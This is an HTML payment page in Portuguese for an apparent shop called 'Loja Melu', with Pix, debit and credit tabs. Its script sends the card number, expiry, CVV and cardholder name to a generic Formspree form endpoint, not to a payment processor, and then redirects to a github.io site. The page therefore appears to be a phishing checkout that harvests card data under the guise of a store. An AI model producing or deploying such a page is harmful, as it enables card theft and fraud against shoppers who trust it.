<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagar ‚Äî Loja Melu</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #ffdee9, #ffc1e3);
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 40px 20px;
    }
    .container {
      background: #fff;
      width: 100%;
      max-width: 700px;
      border-radius: 16px;
      box-shadow: 0 6px 14px rgba(0,0,0,0.15);
      overflow: hidden;
    }
    .tabs {
      display: flex;
      border-bottom: 2px solid #eee;
      background: #ffe6f2;
    }
    .tab {
      flex: 1;
      text-align: center;
      padding: 16px;
      font-weight: bold;
      cursor: pointer;
      color: #cc0066;
      transition: 0.3s;
    }
    .tab.active {
      background: #fff;
      color: #e60073;
      border-bottom: 3px solid #e60073;
    }
    .content {
      padding: 25px;
    }
    h2 {
      margin-top: 0;
      color: #e60073;
    }
    form label {
      display: block;
      margin-top: 12px;
      font-weight: bold;
      color: #444;
    }
    form input, form select {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 15px;
    }
    button {
      margin-top: 25px;
      width: 100%;
      padding: 16px;
      background: #e60073;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: #cc0066;
    }
    .qr-box {
      text-align: center;
      margin-top: 20px;
    }
    .qr-box img {
      width: 200px;
      height: 200px;
      border-radius: 12px;
      border: 4px solid #ffc1e3;
      margin-bottom: 15px;
    }
    .code-input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 10px;
      background: #f9f9f9;
      font-family: monospace;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Abas -->
    <div class="tabs">
      <div class="tab active" onclick="showTab('pix')">Pix</div>
      <div class="tab" onclick="showTab('debito')">D√©bito</div>
      <div class="tab" onclick="showTab('credito')">Cr√©dito</div>
    </div>

    <!-- Conte√∫do -->
    <div class="content">

      <!-- Pix -->
      <div id="pix" class="tab-content">
        <h2>Pagamento via Pix</h2>
        <form class="pagamentoForm">
          <div class="qr-box">
            <img src="../WVGrGNIOV0Vx.br/qrcode.png.lnk" alt="QR Code Pix">
            <input id="pixCode" class="code-input" value="00020126580014br.gov.bcb.pix01368773d579-9a29-4679-80d3-9784acce7ff4520400005303986540519.995802BR5924George Gabriel Ribeiro D6009Sao Paulo610901227-20062240520daqr17315982353911376304AD28" readonly>
            <button type="button" onclick="copyPix()">üìã Copiar c√≥digo</button>
          </div>
          <button type="submit" id="confirmPix" style="display:none;">Confirmar</button>
        </form>
      </div>

      <!-- D√©bito -->
      <div id="debito" class="tab-content" style="display:none;">
        <h2>Pagamento com D√©bito</h2>
        <form class="pagamentoForm">
          <label>Nome no cart√£o</label>
          <input type="text" name="cartao_debito_nome" required>

          <label>N√∫mero do cart√£o</label>
          <input type="number" name="cartao_debito_numero" required>

          <label>Validade</label>
          <input type="text" name="cartao_debito_validade" placeholder="MM/AA" required>

          <label>CVV</label>
          <input type="number" name="cartao_debito_cvv" required>

          <button type="submit">Confirmar</button>
        </form>
      </div>

      <!-- Cr√©dito -->
      <div id="credito" class="tab-content" style="display:none;">
        <h2>Pagamento com Cr√©dito</h2>
        <form class="pagamentoForm">
          <label>Nome no cart√£o</label>
          <input type="text" name="cartao_credito_nome" required>

          <label>N√∫mero do cart√£o</label>
          <input type="number" name="cartao_credito_numero" required>

          <label>Validade</label>
          <input type="text" name="cartao_credito_validade" placeholder="MM/AA" required>

          <label>CVV</label>
          <input type="number" name="cartao_credito_cvv" required>

          <label>Parcelas</label>
          <select name="parcelas" required>
            <option value="1x">1x de R$ 19,99</option>
            <option value="2x">2x de R$ 9,99</option>
            <option value="3x">3x de R$ 6,66</option>
          </select>

          <button type="submit">Confirmar</button>
        </form>
      </div>

    </div>
  </div>

  <script>
    // Controle das abas
    function showTab(tabId) {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
      document.querySelector('.tab[onclick="showTab(\''+tabId+'\')"]').classList.add('active');
      document.getElementById(tabId).style.display = 'block';
    }

    // Copiar Pix
    function copyPix() {
      const pixCode = document.getElementById("pixCode");
      pixCode.select();
      pixCode.setSelectionRange(0, 99999);
      navigator.clipboard.writeText(pixCode.value).then(() => {
        alert("C√≥digo Pix copiado! Agora clique em Confirmar.");
        document.getElementById("confirmPix").style.display = "block";
      });
    }

    // Envio para Formspree + redirecionamento
    document.querySelectorAll(".pagamentoForm").forEach(form => {
      form.addEventListener("submit", function(e) {
        e.preventDefault();
        const data = new FormData(form);

        fetch("https://formspree.io/f/mrbadoya", {
          method: "POST",
          body: data,
          headers: { "Accept": "application/json" }
        }).then(response => {
          if (response.ok) {
            window.location.href = "https://brasilcombr.github.io/Melu/";
          } else {
            alert("Erro ao processar pagamento. Tente novamente.");
          }
        }).catch(() => {
          alert("Erro de conex√£o. Tente novamente.");
        });
      });
    });
  </script>
</body>
</html>
